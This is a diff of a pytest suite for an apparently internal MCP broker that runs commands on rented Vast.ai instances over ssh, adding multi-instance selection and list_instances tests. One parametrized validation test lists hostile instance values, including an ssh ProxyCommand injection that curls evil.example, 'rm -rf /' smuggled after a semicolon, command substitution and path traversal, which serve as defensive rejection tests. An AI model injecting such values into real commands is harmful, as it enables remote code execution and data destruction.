@@ -18,7 +18,8 @@ from project_utils.mcp import vast_remote_broker
 
 # Mimics ssh's own behaviour: everything after the host is joined and
 # handed to a shell, so the server's quoting has to survive one round of
-# shell parsing.
+# shell parsing. Also echoes which host it was pointed at, so tests can
+# verify instance -> ssh_host selection.
 FAKE_SSH = """#!/usr/bin/env bash
 args=()
 while [ $# -gt 0 ]; do
@@ -52,6 +53,22 @@ def sync_script(tmp_path, monkeypatch):
 
 
 @pytest.fixture
+def fake_vastai(tmp_path, monkeypatch):
+    """Stub standing in for the vastai CLI, for list_instances tests. Ignores
+    its argv and prints whatever JSON body the test configures."""
+    script = tmp_path / "fake_vastai.py"
+
+    def write_script(body):
+        script.write_text("#!/usr/bin/env python3\n" + body)
+        script.chmod(script.stat().st_mode | stat.S_IEXEC)
+        return script
+
+    write_script("print('[]')\n")
+    monkeypatch.setenv("VAST_REMOTE_VASTAI_COMMAND", str(script))
+    return write_script
+
+
+@pytest.fixture
 def remote(tmp_path, monkeypatch, sync_script):
     """A configured server whose 'remote' is this machine, in tmp_path."""
     ssh = tmp_path / "fake_ssh"
@@ -65,7 +82,10 @@ def remote(tmp_path, monkeypatch, sync_script):
     (venv / "bin" / "activate").write_text(VENV_ACTIVATE)
 
     monkeypatch.setenv("VAST_REMOTE_SSH_COMMAND", str(ssh))
-    monkeypatch.setenv("VAST_REMOTE_SSH_HOST", "vtao-agent")
+    # "vtao" is the default instance, so remote_exec's default ssh_host
+    # ("<instance>-agent") comes out as "vtao-agent" -- same alias the old
+    # fixed-host env var used, so FAKE_SSH_HOST assertions stay meaningful.
+    monkeypatch.setenv("VAST_REMOTE_DEFAULT_INSTANCE", "vtao")
     monkeypatch.setenv("VAST_REMOTE_WORKDIR", str(workdir))
     monkeypatch.setenv("VAST_REMOTE_VENV", str(venv))
 
@@ -122,8 +142,10 @@ def test_handshake_and_tool_listing(remote):
     tools = {tool["name"]: tool for tool in responses[1]["result"]["tools"]}
     assert set(tools) == set(vast_remote_broker.TOOL_HANDLERS)
     assert tools["remote_exec"]["inputSchema"]["required"] == ["command"]
-    # Flushing takes no required arguments -- it acts on the configured sessions.
+    # Flushing and listing take no required arguments -- they act on the
+    # configured default instance / all labeled instances.
     assert not tools["sync_flush"]["inputSchema"].get("required")
+    assert not tools["list_instances"]["inputSchema"].get("required")
 
 
 def test_reports_stdout_stderr_and_exit_code(remote):
@@ -345,18 +367,20 @@ def test_flush_rejects_a_bad_timeout(remote, timeout_s):
     assert "timeout_s" in text
 
 
-def test_ssh_host_is_required(monkeypatch):
-    monkeypatch.delenv("VAST_REMOTE_SSH_HOST", raising=False)
-    with pytest.raises(RuntimeError, match="VAST_REMOTE_SSH_HOST"):
-        vast_remote_broker.load_config_from_env()
-
-
 def test_defaults_cover_the_optional_settings(monkeypatch):
-    monkeypatch.setenv("VAST_REMOTE_SSH_HOST", "vtao-agent")
-    for name in ("VAST_REMOTE_SSH_COMMAND", "VAST_REMOTE_WORKDIR", "VAST_REMOTE_VENV"):
+    for name in (
+        "VAST_REMOTE_SSH_COMMAND",
+        "VAST_REMOTE_DEFAULT_INSTANCE",
+        "VAST_REMOTE_WORKDIR",
+        "VAST_REMOTE_VENV",
+        "VAST_REMOTE_VASTAI_COMMAND",
+    ):
         monkeypatch.delenv(name, raising=False)
     config = vast_remote_broker.load_config_from_env()
     assert config.ssh_command == ["ssh"]
+    # Matches create_instance.py's --index 0 default alias.
+    assert config.default_instance == "vtao"
+    assert config.vastai_command == ["vastai"]
     assert os.path.isabs(config.workdir) and os.path.isabs(config.venv)
     assert config.control_path
     assert config.control_persist
@@ -391,7 +415,7 @@ exec /bin/sh -c "${{args[*]:1}}"
     workdir = tmp_path / "workdir"
     workdir.mkdir()
     monkeypatch.setenv("VAST_REMOTE_SSH_COMMAND", str(ssh))
-    monkeypatch.setenv("VAST_REMOTE_SSH_HOST", "vtao-agent")
+    monkeypatch.setenv("VAST_REMOTE_DEFAULT_INSTANCE", "vtao")
     monkeypatch.setenv("VAST_REMOTE_WORKDIR", str(workdir))
     monkeypatch.delenv("VAST_REMOTE_VENV", raising=False)
     config = vast_remote_broker.load_config_from_env()
@@ -400,3 +424,124 @@ exec /bin/sh -c "${{args[*]:1}}"
     assert "exit code: 0" in text
     assert "alive" in text
     assert marker.exists()
+
+
+# --- multi-instance: instance argument selection & validation ---------------
+
+
+def test_instance_argument_selects_which_rental_remote_exec_targets(remote):
+    is_error, text = remote.exec("true", instance="vtao1")
+    assert not is_error, text
+    assert "FAKE_SSH_HOST=vtao1-agent" in text
+
+
+def test_default_instance_is_used_when_none_given(remote):
+    is_error, text = remote.exec("true")
+    assert not is_error, text
+    assert "FAKE_SSH_HOST=vtao-agent" in text
+
+
+def test_flush_passes_instance_as_host_to_sync_script(remote, sync_script):
+    sync_script("import sys, json\nprint(json.dumps(sys.argv[1:]))\n")
+    is_error, text = remote.flush(instance="vtao1")
+    assert not is_error, text
+    assert json.dumps(["flush", "--host", "vtao1"]) in text
+
+
+def test_flush_defaults_to_the_configured_default_instance(remote, sync_script):
+    sync_script("import sys, json\nprint(json.dumps(sys.argv[1:]))\n")
+    is_error, text = remote.flush()
+    assert not is_error, text
+    assert json.dumps(["flush", "--host", "vtao"]) in text
+
+
+@pytest.mark.parametrize(
+    "instance",
+    [
+        "",
+        "-oProxyCommand=curl evil.example",
+        "vtao/../etc",
+        "vtao;rm -rf /",
+        "vtao agent",
+        "vtao$(whoami)",
+    ],
+)
+def test_invalid_instance_is_rejected_by_remote_exec(remote, instance):
+    """A caller-controlled instance string lands in ssh's argv; a leading '-'
+    in particular must not be readable as a flag (e.g. ProxyCommand)."""
+    is_error, text = remote.exec("true", instance=instance)
+    assert is_error
+    assert "instance" in text.lower()
+
+
+@pytest.mark.parametrize("instance", ["", "vtao/etc", "vtao;x"])
+def test_invalid_instance_is_rejected_by_sync_flush(remote, instance):
+    is_error, text = remote.flush(instance=instance)
+    assert is_error
+    assert "instance" in text.lower()
+
+
+# --- list_instances -----------------------------------------------------
+
+
+def test_list_instances_filters_by_label_prefix(remote, fake_vastai):
+    fake_vastai(
+        "import json\n"
+        "print(json.dumps([\n"
+        "    {'label': 'vtao-0', 'id': 1, 'actual_status': 'running',\n"
+        "     'ssh_host': '1.2.3.4', 'ssh_port': 22, 'status_msg': ''},\n"
+        "    {'label': 'other-project', 'id': 2, 'actual_status': 'running',\n"
+        "     'ssh_host': '5.6.7.8', 'ssh_port': 22, 'status_msg': ''},\n"
+        "]))\n"
+    )
+    remote.config = vast_remote_broker.load_config_from_env()
+    is_error, text = remote.call("list_instances", {})
+    assert not is_error, text
+    assert "vtao-0" in text
+    assert "id=1" in text
+    assert "other-project" not in text
+
+
+def test_list_instances_no_matches_is_not_an_error(remote, fake_vastai):
+    fake_vastai("print('[]')\n")
+    remote.config = vast_remote_broker.load_config_from_env()
+    is_error, text = remote.call("list_instances", {})
+    assert not is_error, text
+    assert "no instances" in text.lower()
+
+
+def test_list_instances_custom_label_prefix(remote, fake_vastai):
+    fake_vastai(
+        "import json\n"
+        "print(json.dumps([\n"
+        "    {'label': 'vtao-0', 'id': 1, 'actual_status': 'running'},\n"
+        "    {'label': 'other-9', 'id': 2, 'actual_status': 'running'},\n"
+        "]))\n"
+    )
+    remote.config = vast_remote_broker.load_config_from_env()
+    is_error, text = remote.call("list_instances", {"label_prefix": "other-"})
+    assert not is_error, text
+    assert "other-9" in text
+    assert "vtao-0" not in text
+
+
+def test_list_instances_reports_vastai_failure(remote, fake_vastai):
+    fake_vastai("import sys\nprint('bad key', file=sys.stderr)\nsys.exit(1)\n")
+    remote.config = vast_remote_broker.load_config_from_env()
+    is_error, text = remote.call("list_instances", {})
+    assert is_error
+    assert "bad key" in text
+
+
+def test_list_instances_reports_unparseable_output(remote, fake_vastai):
+    fake_vastai("print('not json')\n")
+    remote.config = vast_remote_broker.load_config_from_env()
+    is_error, text = remote.call("list_instances", {})
+    assert is_error
+    assert "json" in text.lower()
+
+
+def test_list_instances_rejects_non_string_label_prefix(remote):
+    is_error, text = remote.call("list_instances", {"label_prefix": 5})
+    assert is_error
+    assert "label_prefix" in text
